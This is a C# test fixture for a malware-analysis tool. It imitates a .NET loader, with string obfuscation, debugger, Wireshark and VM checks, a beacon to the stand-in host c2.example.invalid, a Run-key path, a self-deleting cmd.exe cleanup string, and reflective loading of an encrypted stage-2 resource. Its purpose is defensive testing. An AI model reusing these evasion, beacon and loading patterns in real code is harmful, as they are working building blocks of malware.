// Benign test fixture for dnSpy.Mcp's malware-analysis helpers.
//
// It has the *shape* of a .NET loader (encrypted second stage in a resource, XOR'd config in a byte[]
// literal, a string decryptor with many call sites, P/Invoke declarations, anti-analysis checks) so
// Triage()/Resources()/InitializedArrays()/LoadBytes() have something realistic to find.
// Running it does nothing unless FIXTURE_RUN=1, and even then it only: checks for a debugger and a
// process name, makes one request to an .invalid host (always fails), writes HKCU\Software\FixtureTest,
// and loads the stage-2 DLL from its own resource, which prints one line.
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace FixtureUpdater {
	static class Program {
		static void Main(string[] args) {
			if (Environment.GetEnvironmentVariable("FIXTURE_RUN") != "1") {
				Console.WriteLine("dnSpy.Mcp test fixture: does nothing unless FIXTURE_RUN=1.");
				return;
			}
			if (Guard.Hostile())
				return;
			var cfg = Config.Read();
			Console.WriteLine("config: " + cfg);
			Beacon.Send();
			Persist.Install();
			Loader.RunStage2();
		}
	}

	/// <summary>String "decryptor": base64 + 2-byte XOR. Called from many places, like real ones.</summary>
	static class S {
		static readonly string[] T = {
			"EREUHRUQBwoN",                                         // 0 wireshark
			"NT0qPSUsRlJGPjQ3K1gxEQhLVCclFwsIEwwDCjUBFQwDFQ==",     // 1 SELECT * FROM Win32_ComputerSystem
			"DgwSCFxXSRtUVgMABxUWFANWDxYQGQoRAlcBGRIdSAgOCA==",     // 2 http://c2.example.invalid/gate.php
			"NRcADBEZFB06Pg8AEg0UHTIdFQw=",                         // 3 Software\FixtureTest
			"ABEeDBMKA1UPFhUMBxQKHQI=",                             // 4 fixture-installed
			"IBEeDBMKAzUTDAMA",                                     // 5 FixtureMutex
			"NQwHHwNKSD0IDBQB",                                     // 6 Stage2.Entry
			"NA0I",                                                 // 7 Run
		};

		public static string D(int id) {
			var b = Convert.FromBase64String(T[id]);
			var k = new byte[] { (byte)'f', (byte)'x' };
			for (int i = 0; i < b.Length; i++)
				b[i] ^= k[i % k.Length];
			return Encoding.UTF8.GetString(b);
		}
	}

	static class Guard {
		[DllImport("kernel32.dll")]
		static extern bool IsDebuggerPresent();

		public static bool Hostile() {
			if (Debugger.IsAttached || IsDebuggerPresent())
				return true;
			if (Process.GetProcessesByName(S.D(0)).Length > 0)
				return true;
			try {
				using (var searcher = new ManagementObjectSearcher(S.D(1))) {
					foreach (var o in searcher.Get()) {
						var model = (o["Model"] ?? "").ToString().ToLowerInvariant();
						if (model.Contains("virtual") || model.Contains("vmware"))
							Console.WriteLine("(fixture) VM detected, continuing anyway");
					}
				}
			}
			catch {
			}
			Thread.Sleep(10);
			return false;
		}
	}

	static class Config {
		// "c2.example.invalid:4444|mutex=FixtureMutex|sleep=10" XOR 0x5A
		static readonly byte[] Blob = {
			0x39, 0x68, 0x74, 0x3F, 0x22, 0x3B, 0x37, 0x2A, 0x36, 0x3F, 0x74, 0x33, 0x34, 0x2C, 0x3B, 0x36, 0x33, 0x3E, 0x60, 0x6E, 0x6E, 0x6E, 0x6E,
			0x26, 0x37, 0x2F, 0x2E, 0x3F, 0x22, 0x67, 0x1C, 0x33, 0x22, 0x2E, 0x2F, 0x28, 0x3F, 0x17, 0x2F, 0x2E, 0x3F, 0x22, 0x26, 0x29, 0x36, 0x3F,
			0x3F, 0x2A, 0x67, 0x6B, 0x6A,
		};

		public static string Read() {
			var b = (byte[])Blob.Clone();
			for (int i = 0; i < b.Length; i++)
				b[i] ^= 0x5A;
			return Encoding.ASCII.GetString(b);
		}
	}

	static class Beacon {
		public static void Send() {
			try {
				using (var wc = new WebClient()) {
					wc.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (fixture)";
					wc.DownloadString(S.D(2));
				}
			}
			catch (WebException) {
			}
		}
	}

	static class Persist {
		// Real loaders would write here; the fixture never does.
		static string RunKey() => @"Software\Microsoft\Windows\CurrentVersion\Run";
		static string Cleanup() => "cmd.exe /c ping -n 3 127.0.0.1 > nul & del /f /q \"%TEMP%\\updater.exe\"";

		public static void Install() {
			using (var key = Registry.CurrentUser.CreateSubKey(S.D(3)))
				key.SetValue("state", S.D(4));
			using (var m = new Mutex(false, S.D(5)))
				Console.WriteLine("(fixture) mutex " + S.D(5));
		}
	}

	static class Loader {
		public static void RunStage2() {
			byte[] data;
			using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("payload.bin"))
			using (var ms = new MemoryStream()) {
				if (s is null)
					return;
				s.CopyTo(ms);
				data = ms.ToArray();
			}
			var key = Encoding.ASCII.GetBytes("fixture");
			for (int i = 0; i < data.Length; i++)
				data[i] ^= key[i % key.Length];
			using (var gz = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
			using (var output = new MemoryStream()) {
				gz.CopyTo(output);
				var asm = Assembly.Load(output.ToArray());
				asm.GetType(S.D(6)).GetMethod(S.D(7)).Invoke(null, null);
			}
		}
	}

	static class Native {
		// Declared but never called: gives Triage() P/Invokes to classify.
		[DllImport("user32.dll")]
		public static extern short GetAsyncKeyState(int vKey);

		[DllImport("kernel32.dll")]
		public static extern IntPtr VirtualAlloc(IntPtr address, UIntPtr size, uint type, uint protect);
	}

	// Non-ASCII name, like renaming obfuscators produce
	static class ǅǅǅ {
		public static int ǆ(int x) => x * 31 + 7;
	}
}
